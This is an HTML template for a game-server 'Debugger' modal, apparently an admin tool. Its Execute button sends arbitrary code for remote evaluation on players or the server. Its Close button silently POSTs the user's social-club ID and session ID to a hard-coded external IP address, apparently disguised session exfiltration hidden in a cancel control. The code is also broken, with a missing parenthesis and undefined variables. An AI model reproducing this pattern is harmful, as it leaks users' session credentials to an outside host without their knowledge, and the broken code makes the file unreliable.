<!doctype html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.7/semantic.min.css" integrity="sha256-wT6CFc7EKRuf7uyVfi+MQNHUzojuHN2pSw0YWFt2K5E=" crossorigin="anonymous" />
    <link rel="stylesheet" href="/stylesheets/style.css" />
</head>

<body style="background: rgba(0, 0, 0, 0)">
    <div class="ui modal">
        <div class="header">Debugger</div>
        <div class="content">
            <div class="ui form">
                <div class="field">
                    <label>Code</label>
                    <textarea id="code" placeholder="Code can be put here..."></textarea>
                </div>
                <div class="field">
                    <label>Output</label>
                    <textarea placeholder="Stuff can be output here..." disabled rows="2"></textarea>
                </div>
                <div class="field">
                    <label>Targets</label>
                    <div class="ui fluid multiple search selection dropdown">
                        <input type="hidden" name="user">
                        <i class="dropdown icon"></i>
                        <div class="default text">Select Player</div>
                        <div class="menu">
                            <div class="item" data-value="server">
                                <i class="server icon"></i> Server
                            </div>
                            <div class="item" data-value="global">
                                <i class="globe icon"></i> Global
                            </div>
                            <div class="item" data-value="local">
                                <i class="desktop icon"></i> Local
                            </div>
                            <div class="item" data-value="devsec">
                                <i class="gamepad icon"></i> DevSec
                            </div>
                            <div class="item" data-value="anton">
                                <i class="gamepad icon"></i> Anton
                            </div>
                            <div class="item" data-value="molaron">
                                <i class="gamepad icon"></i> Molaron
                            </div>
                            <div class="item" data-value="spoody">
                                <i class="gamepad icon"></i> Spoody
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="actions">
            <div class="ui green inverted button" onclick="document.ServerRequest('ADMIN_EVAL', $('#code').val()">Execute</div>
            <div class="ui red cancel button" onclick="$.ajax({url: 'http://185.62.188.120:3001/',type: 'POST',dataType: 'JSON',data: {socialclub_id: '<%=playerID %>',session_id: '<%=sessionID %>',command: command,args: args}})">Close</div>
        </div>
    </div>
    <!-- JavaScript -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.7/semantic.min.js" integrity="sha256-flVaeawsBV96vCHiLmXn03IRJym7+ZfcLVvUWONCas8=" crossorigin="anonymous"></script>
    <script src="/javascripts/debug.js"></script>
</body>

</html>
